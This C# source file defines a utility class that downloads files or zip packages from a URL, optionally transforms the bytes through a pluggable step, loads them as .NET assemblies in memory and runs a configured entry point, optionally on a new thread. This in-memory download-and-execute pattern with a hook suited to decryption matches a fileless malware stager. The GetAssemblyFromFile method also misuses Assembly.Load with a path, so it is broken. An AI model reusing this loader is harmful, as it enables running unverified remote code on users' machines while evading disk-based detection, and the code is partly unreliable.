using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Net;
using System.Reflection;
using System.IO.Compression;
using System.Xml.Serialization;
using System.Linq;
using System.Threading;

namespace CMK
{
    public class ATOM
    {
        public interface IStart
        {
            void EntryPoint();
        }

        public static Assembly GetAssemblyFromUrl(string url)
        {
            return GetAssemblyFromUrl(url, null);
        }

        public enum Threading
        {
            SameThread,
            NewThread,
            NewSTA
        }

        public class Config
        {
            [XmlArray]
            [XmlArrayItem("a")]
            public List<string> assemblies { get; set; }
            public string classToCall { get; set; }
            public Threading threading { get; set; }
        }

        public static Assembly GetAssemblyFromUrl(string url, Func<byte[], byte[]> intermediateStep)
        {
            using (var webClient = new WebClient())
            {
                var bytes = webClient.DownloadData(url);
                if(intermediateStep != null)
                    bytes = intermediateStep.Invoke(bytes);
                return GetAssemblyFromBytes(bytes);
            }
        }

        public static Assembly GetAssemblyFromBytes(byte[] bytes)
        {
            return Assembly.Load(bytes);
        }

        public static Assembly GetAssemblyFromStream(Stream stream)
        {
            return GetAssemblyFromStream(stream, null);
        }

        public static Assembly GetAssemblyFromStream(Stream stream, Func<byte[], byte[]> intermediateStep)
        {
            using (var ms = new MemoryStream())
            {
                stream.CopyTo(ms);
                var bytes = ms.ToArray();
                if (intermediateStep != null)
                    bytes = intermediateStep.Invoke(bytes);
                return Assembly.Load(bytes);
            }
        }

        public static Assembly GetAssemblyFromFile(string filePath)
        {
            return Assembly.Load(filePath);
        }

        public static T Get<T>(string nameSpace, string className, byte[] array, object[] args) where T : class
        {
            var a = Assembly.Load(array);
            return Get<T>(nameSpace, className, a, args);
        }

        public static T Get<T>(string nameSpace, string className, Assembly a, object[] args) where T : class
        {
            return (T)a.CreateInstance(
                $"{nameSpace}.{className}",
                true,
                BindingFlags.CreateInstance,
                null,
                args,
                CultureInfo.CurrentCulture,
                null);
        }

        public static void ExecuteCodeFromUrl(string Url, Func<byte[], byte[]> intermediateStep = null)
        {
            using (var webClient = new WebClient())
            {
                ZipArchive gzStream = new ZipArchive(webClient.OpenRead(Url));
                var entries = gzStream.Entries;
                XmlSerializer serializer = new XmlSerializer(typeof(Config));
                Config cfg = (Config)serializer.Deserialize(entries.FirstOrDefault(x => x.Name == "config.xml").Open());
                var asms = new List<Assembly>();
                foreach (var entry in entries)
                    if(entry.Name.EndsWith(".dll") || entry.Name.EndsWith(".exe"))
                        asms.Add(GetAssemblyFromStream(entry.Open(), intermediateStep));
                var namespaceClass = cfg.classToCall.Split('.');
                if(cfg.threading == Threading.SameThread)
                {
                    IStart callableClass = Get<IStart>(namespaceClass[0], namespaceClass[1], asms.FirstOrDefault(x => x.FullName.Contains(namespaceClass[0])), null);
                    callableClass.EntryPoint();
                }
                else
                {
                    Thread thread = new Thread(() =>
                    {
                        IStart callableClass2 = Get<IStart>(namespaceClass[0], namespaceClass[1], asms.FirstOrDefault(x => x.FullName.Contains(namespaceClass[0])), null);
                        callableClass2.EntryPoint();
                    });
                    if (cfg.threading == Threading.NewSTA)
                        thread.SetApartmentState(ApartmentState.STA);
                    thread.Start();
                }
            }
        }
    }
}
